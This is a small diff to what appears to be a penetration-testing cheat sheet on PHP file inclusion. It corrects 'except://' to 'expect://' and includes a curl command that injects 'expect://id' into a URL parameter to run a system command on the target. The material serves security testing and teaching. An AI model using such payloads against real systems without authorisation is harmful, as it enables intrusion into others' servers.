@@ -69,12 +69,12 @@ The research article "[PHP filters chain: What is it and how to use it](https://
 
 <details>
 
-<summary>except://</summary>
+<summary>expect://</summary>
 
-The `except` wrapper doesn't required the `allow_url_include` configuration, the `except` extension is required instead.
+The `expect` wrapper doesn't required the `allow_url_include` configuration, the `expect` extension is required instead.
 
 ```bash
-curl --user-agent "PENTEST" -s "$URL/?parameter=except://id"
+curl --user-agent "PENTEST" -s "$URL/?parameter=expect://id"
 ```
 
 </details>
